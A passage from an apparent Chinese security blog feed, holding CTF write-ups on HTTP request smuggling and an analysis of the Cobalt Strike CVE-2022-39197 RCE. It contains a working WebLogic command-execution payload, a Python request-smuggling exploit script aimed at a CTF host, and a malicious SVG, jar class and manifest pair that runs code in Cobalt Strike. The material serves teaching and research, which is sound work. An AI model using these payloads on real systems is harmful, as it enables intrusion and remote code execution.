/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n&#x27;&#x27;&#x27;</span><br>sSocket.send(payload)<br>sSocket.settimeout(<span class="hljs-number">2</span>)<br>response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(response) &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(response.decode())<br>    <span class="hljs-keyword">try</span>:<br>        response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">break</span><br>sSocket.close()<br></code></pre></td></tr></table></figure><h3 id="RCTF2019-esay-calc"><a href="#RCTF2019-esay-calc" class="headerlink" title="RCTF2019[esay calc]"></a>RCTF2019[esay calc]</h3><h4 id="常规绕waf"><a href="#常规绕waf" class="headerlink" title="常规绕waf"></a>常规绕waf</h4><p>首先查看源码根据提示来到calc.php</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505092703693.png" class="" title="image-20220505092703693"><p>代码对特殊字符进行了一些过滤，注意到最后代码执行，我们传入：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">calc.php?num=;)phpinfo();<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>执行后发现：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505092950651.png" class="" title="image-20220505092950651"><p>明显是有waf不合法请求，有一种做法是<strong>参数前面加空格使服务器无法解析绕waf</strong>，再用ascii转码读文件：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">? num=readfile(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>))<br></code></pre></td></tr></table></figure><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505094817900.png" class="" title="image-20220505094817900"><h4 id="走私绕waf"><a href="#走私绕waf" class="headerlink" title="走私绕waf"></a>走私绕waf</h4><p>注意到只要能让前端服务器报错我们就能突破前端waf限制；所以事实上我们还可以利用走私攻击绕waf，而且前面四种方式都是有效的，这里<strong>举两个例子</strong>，剩下几种大家可以自行尝试：</p><p>注意下面的请求中num前没有空格了。</p><h5 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL CL"></a>CL CL</h5><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505095522705.png" class="" title="image-20220505095522705"><h5 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL TE"></a>CL TE</h5><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505095701181.png" class="" title="image-20220505095701181"><h3 id="ISCC2022-让我康康"><a href="#ISCC2022-让我康康" class="headerlink" title="ISCC2022[让我康康!]"></a>ISCC2022[让我康康!]</h3><h4 id="分析与利用"><a href="#分析与利用" class="headerlink" title="分析与利用"></a>分析与利用</h4><p>​如果直接访问flag会爆403：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503003840356.png" class="" title="image-20220503003840356"><p>我们通过相应包的头部发现了gunicorn20.0，经查阅版本存在请求走私，具体可参考：</p><p><a href="https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/">https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/</a></p><p>通过给出的POC我们编写脚本成功实现请求走私，看到要求很明显是需要获取前端服务器请求头的来源IP名称来伪造本地访问获取flag：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503003038852.png" class="" title="image-20220503003038852"><p>那么我的思路就是多次发送请求，并且设置前一个请求的CL为超过实际请求体的较大数值；由于后端服务器设置Keep-Alive，所以它会误认为请求没有发送完毕，会继续等待；而这时候我们再给前端服务器发送一个请求，前端服务器就会把带有来源IP头部的http包发送给后端服务器，后端服务器接收足够上一包内CL的时候就会把这个泄露敏感凭证的包一并返回给客户端，从而造成了敏感信息泄露。</p><p>其实思路与上面讲到的应用实例2一样，<strong>只不过gunicorn20.0的走私漏洞是由于默认Sec-Websocket-Key的配置导致后端服务器会以xxxxxxxx为标识位，这就导致xxxxxxxx后面的部分会滞留在缓存区，可以认为是一种变种的CL TE走私。</strong></p><p>我们可以通过burp直接构造请求，<strong>但是由于Content-Length需要我们自定义，比如第一个Content-Length仅仅是计算到第一个手动添加的POST请求，所以构造的时候要额外小心。</strong></p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505002029215.png" class="" title="image-20220505002029215"><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505002302025.png" class="" title="image-20220505002302025"><p>当然我们直接写脚本拿socket发更直观。</p><h4 id="最终exp-1"><a href="#最终exp-1" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>secret_payload=<span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span><br><span class="hljs-string">Host: 59.110.159.206:7020\r</span><br><span class="hljs-string">Content-Length: 149\r</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">Sec-Websocket-Key1:x\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">xxxxxxxxPOST / HTTP/1.1\r</span><br><span class="hljs-string">Host:127.0.0.1\r</span><br><span class="hljs-string">secr3t_ip: 127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 150\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=abc\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">POST / HTTP/1.1\r</span><br><span class="hljs-string">Content-Length: 14\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=111\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>final_payload=<span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span><br><span class="hljs-string">Host: 59.110.159.206:7020\r</span><br><span class="hljs-string">Content-Length: 152\r</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">Sec-Websocket-Key1:x\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">xxxxxxxxGET /fl4g HTTP/1.1\r</span><br><span class="hljs-string">Host:127.0.0.1\r</span><br><span class="hljs-string">secr3t_ip: 127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 150\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=abc\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">POST / HTTP/1.1\r</span><br><span class="hljs-string">Content-Length: 14\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=111\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>test1 = <span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span><br><span class="hljs-string">Host: 127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 67\r</span><br><span class="hljs-string">Sec-Websocket-Key1:x\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">xxxxxxxxGET /fl4g HTTP/1.1\r</span><br><span class="hljs-string">Host:127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 123\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">GET / HTTP/1.1\r</span><br><span class="hljs-string">Host: 127.0.0.1\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>test2=<span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 59.110.159.206:7020</span><br><span class="hljs-string">Content-Length: 10</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string"></span><br><span class="hljs-string">search=123&#x27;&#x27;&#x27;</span><br><br>sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sSocket.connect((<span class="hljs-string">&quot;59.110.159.206&quot;</span>, <span class="hljs-number">7020</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-built_in">print</span>(payload)<br>    sSocket.send(payload)<br>    sSocket.settimeout(<span class="hljs-number">2</span>)<br>    response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(response) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(response.decode())<br>        <span class="hljs-keyword">try</span>:<br>            response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    sSocket.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    send(final_payload)<br></code></pre></td></tr></table></figure><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505010110383.png" class="" title="image-20220505010110383"><h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p><a href="https://regilero.github.io/tag/Smuggling/">https://regilero.github.io/tag/Smuggling/</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p><p><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a></p><p><a href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>http请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-39197 CS RCE分析复现</title>
    <link href="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike-lt-x3D-4-7-1-RCE-简单分析与复现"><a href="#Cobalt-Strike-lt-x3D-4-7-1-RCE-简单分析与复现" class="headerlink" title="Cobalt Strike &lt;&#x3D;4.7.1 RCE 简单分析与复现"></a>Cobalt Strike &lt;&#x3D;4.7.1 RCE 简单分析与复现</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2022-39197这个洞是前段时间爆出来的，具体的复现过程也是拜读了漂亮鼠师傅的文章:</p><p><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</a></p><p>漏洞具体的细节不再赘述，思路和上面提到的文章一样，核心就是以下几点：</p><ul><li>由于Swing库依赖加上CS本身的UI对html的渲染，导致我们引入html标签造成XSS。</li><li>CS里规定了不同的html标签有不同的解析方式，其中&lt;object&gt;标签允许我们传入指定类完成特定操作，要求是<ol><li>传入的类必须继承Component</li><li>类必须有无参构造方法</li><li>类必须存在一个拥有setXXX方法的属性</li><li>setXXX方法只能传入一个String作为参数</li></ol></li><li>关于触发点，我们需要找到CS中通过AES传输的数据模块，比如note、processlist、computer等</li></ul><h2 id="0x01-使用codeql寻找符合条件的类"><a href="#0x01-使用codeql寻找符合条件的类" class="headerlink" title="0x01 使用codeql寻找符合条件的类"></a>0x01 使用codeql寻找符合条件的类</h2><p>类的约束我们已经有了，下面就是怎么找的问题，首先直接在idea里搜索肯定是不行的，仅仅是继承自Component的子类在jdk中就有上百个：</p><img src="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221022235902337.png" class="" title="image-20221022235902337"><p>一个个筛肯定是不行的(如果有耐心的话好像也不是不行- -)，更好的办法肯定就是用静态分析工具了，使用codeql、tabby编写对应规则然后进行静态分析即可，好像还有师傅用Gadget Inspector直接搞出了攻击链，这点我不是很清楚，我使用的是codeql。</p><p>由于之前有编译好的jdk8的数据库，为图省事我就直接拿来用了，使用我粗糙的手法简单写一下ql语句，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassOrInterface</span>&#123;<br>    MyComponent()&#123;<br>        <span class="hljs-built_in">this</span>.getName()=<span class="hljs-string">&quot;Component&quot;</span> or <br>        <span class="hljs-built_in">this</span>.getAnAncestor().getName()=<span class="hljs-string">&quot;Component&quot;</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UsableClass</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RefType</span> &#123;<br>    UsableClass()&#123;<br>        <span class="hljs-built_in">this</span>.getAConstructor().hasNoParameters() and <br>        <span class="hljs-built_in">this</span>.getAConstructor().isPublic()<br>    &#125;<br>&#125;<br><br>predicate <span class="hljs-title function_">isMyClass</span><span class="hljs-params">( Class m)</span>&#123;<br>    m.getASourceSupertype() <span class="hljs-keyword">instanceof</span> MyComponent and<br>    m <span class="hljs-keyword">instanceof</span> UsableClass <br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UsableMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Method</span> &#123;<br>    UsableMethod() &#123;<br>        <span class="hljs-built_in">this</span>.getNumberOfParameters() = <span class="hljs-number">1</span><br>        and <span class="hljs-built_in">this</span>.getAParamType().hasName(<span class="hljs-string">&quot;String&quot;</span>)<br>        and <span class="hljs-built_in">this</span>.isPublic()<br>        and <span class="hljs-built_in">this</span>.getName().matches(<span class="hljs-string">&quot;set%&quot;</span>)<br>        &#125;<br>    &#125;<br><br>from UsableMethod me ,UsableClass cla<br>where <br>    <span class="hljs-title function_">isMyClass</span><span class="hljs-params">(cla)</span> and me.getDeclaringType() = cla<br>select cla<br><br></code></pre></td></tr></table></figure><p>结果是30多个类：</p><img src="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221023001615811.png" class="" title="image-20221023001615811"><p>然后我开始逐一寻找有无可以通过setXXX构造出攻击链的类，但是寻找了一番后没有结果，而且这些类都是来自jdk自带的Swing标准库，作为一个老牌UI库应该很难能有漏洞利用点。</p><p>就在陷入迷茫的时候，我突然想到，CS里是不是自带的lib里引入了swing库，结果一看确实存在，就在org.apache.batik包内。于是下面我用同样的方法，编译CS的源码载入codeql的database，结果也是30多个类，大多数类也都没有利用点，但有一个类 JSVGCanvas 引起了我的注意。</p><h2 id="0x02-org-apache-batik-JSVGCanvas"><a href="#0x02-org-apache-batik-JSVGCanvas" class="headerlink" title="0x02 org.apache.batik.JSVGCanvas"></a>0x02 org.apache.batik.JSVGCanvas</h2><p>JSVGCanvas类里有一个setURI方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setURI</span><span class="hljs-params">(String var1)</span> &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.uri;<br>   <span class="hljs-built_in">this</span>.uri = var1;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-built_in">this</span>.loadSVGDocument(<span class="hljs-built_in">this</span>.uri);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">this</span>.setSVGDocument((SVGDocument)<span class="hljs-literal">null</span>);<br>   &#125;<br><br>   <span class="hljs-built_in">this</span>.pcs.firePropertyChange(<span class="hljs-string">&quot;URI&quot;</span>, var2, <span class="hljs-built_in">this</span>.uri);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码很直白，直接允许我们引入外部svg，其实到这里我是比较怀疑的，在我的印象中svg不是图片格式么，通过引用图片能直接触发RCE吗？</p><p>然后我就在这里卡了很久，网上关于svg安全问题的资料几乎没有，最后看到了国外的一篇<a href="https://securityintelligence.com/posts/analysis-rce-vulnerability-cobalt-strike/">文章</a>，是查了<a href="https://xmlgraphics.apache.org/batik/using/scripting/java.html">batik的文档</a>才发现的。</p><p>文档中有一段代码提到：</p><blockquote><p>The follow code template demonstrates how to manipulate an SVG document displayed in a <a href="https://xmlgraphics.apache.org/batik/javadoc/org/apache/batik/swing/JSVGCanvas.html">JSVGCanvas</a> directly from a Java program. You don’t have to worry about graphics updates; after each event listener invocation the canvas is updated if needed.</p></blockquote><p>告诉我们如何通过去加载SVGDocument，代码样例有很多UI库里的Action实现，这给了我们一个启发，我们可以直接注册一个listner去监听初始化进程，当svg加载的时候就可以直接触发恶意代码。</p><p>在文档的末尾提到如何利用svg去执行java代码：</p><img src="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221023005415495.png" class="" title="image-20221023005415495"><p>可以看到svg是支持插入html标签的，根据文档指示我们可以归纳出以下几点要求：</p><ul><li>需要在指定SVG中插入html，并指定<strong>xlink:href</strong>属性为java归档文件</li><li>类必须继承自<strong>EventListenerInitializer</strong>，需要添加listener以触发执行指定代码</li><li>需要在jar清单中指定<strong>SVG-Handler-Class</strong>属性为类路径</li></ul><p>顺着这些要求我们下一步开始构造。</p><h2 id="0x03-触发漏洞"><a href="#0x03-触发漏洞" class="headerlink" title="0x03 触发漏洞"></a>0x03 触发漏洞</h2><p>batik可以直接通过maven引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>xml-apis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xml-apis-ext<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.04<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先是编写好要执行的java代码，重写匿名内部类的handleEvent方法，嵌入恶意代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilSVG.java</span><br><span class="hljs-keyword">package</span> org.spring.test;<br><span class="hljs-keyword">import</span> org.w3c.dom.events.EventListener;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.EventListenerInitializer;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.SVGDocument;<br><span class="hljs-keyword">import</span> org.w3c.dom.svg.SVGSVGElement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilSVG</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EventListenerInitializer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilSVG</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeEventListeners</span><span class="hljs-params">(SVGDocument svgDocument)</span> &#123;<br>        <span class="hljs-type">SVGSVGElement</span> <span class="hljs-variable">rootElement</span> <span class="hljs-operator">=</span> svgDocument.getRootElement();<br>        <span class="hljs-type">EventListener</span> <span class="hljs-variable">eventListener</span> <span class="hljs-operator">=</span> event -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;;<br>        rootElement.addEventListener(<span class="hljs-string">&quot;spring&quot;</span>, eventListener,<span class="hljs-literal">false</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后准备好svg和清单：</p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs svg">//1.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span> = <span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span> = <span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">&quot;0 0 0 0 &quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;5.jar&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//Manifest</span><br>Manifest-<span class="hljs-keyword">Version</span>: 1.0<br>SVG-Handler-<span class="hljs-keyword">Class</span>: org.spring.<span class="hljs-keyword">test</span>.EvilSVG<br></code></pre></td></tr></table></figure><p>其实这里也可以直接使用maven去添加SVG-Handler-Class：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">spring.svg</span>&gt;</span>org.spring.test.EvilSVG<span class="hljs-tag">&lt;/<span class="hljs-name">spring.svg</span>&gt;</span><br><br>....<br><br><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span 